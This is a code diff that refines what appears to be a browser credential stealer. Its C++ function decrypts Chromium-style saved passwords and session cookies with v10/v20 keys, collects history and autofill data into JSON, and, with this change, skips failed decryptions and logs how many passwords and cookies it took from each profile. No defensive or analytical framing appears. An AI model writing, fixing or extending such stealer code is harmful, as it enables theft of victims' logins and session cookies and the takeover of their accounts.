@@ -301,7 +301,7 @@ void do_work() {
                         auto& key = is_v20 ? v20_key : v10_key;
                         if (!key.empty()) {
                             auto dec = aes_gcm_decrypt(key, enc_pass);
-                            p_data.passwords.push_back({ url, user, std::string(dec.begin(), dec.end()) });
+                            if (!dec.empty()) p_data.passwords.push_back({ url, user, std::string(dec.begin(), dec.end()) });
                         }
                     }
                     sqlite3_finalize(stmt);
@@ -331,8 +331,10 @@ void do_work() {
                         auto& key = is_v20 ? v20_key : v10_key;
                         if (!key.empty()) {
                             auto dec = aes_gcm_decrypt(key, enc_val);
-                            if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
-                            p_data.cookies.push_back({ host, name, std::string(dec.begin(), dec.end()) });
+                            if (!dec.empty()) {
+                                if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
+                                p_data.cookies.push_back({ host, name, std::string(dec.begin(), dec.end()) });
+                            }
                         }
                     }
                     sqlite3_finalize(stmt);
@@ -390,6 +392,7 @@ void do_work() {
         for (auto& h : p_data.history) pj["history"].push_back({{"url", h.url}, {"title", h.title}, {"visit_count", h.visit_count}});
         pj["autofill"] = json::array();
         for (auto& a : p_data.autofill) pj["autofill"].push_back({{"name", a.name}, {"value", a.value}});
+        log_to_file("Profile " + profile + " summary: " + std::to_string(p_data.passwords.size()) + " passwords, " + std::to_string(p_data.cookies.size()) + " cookies.");
         collected.push_back(pj);
     }
 
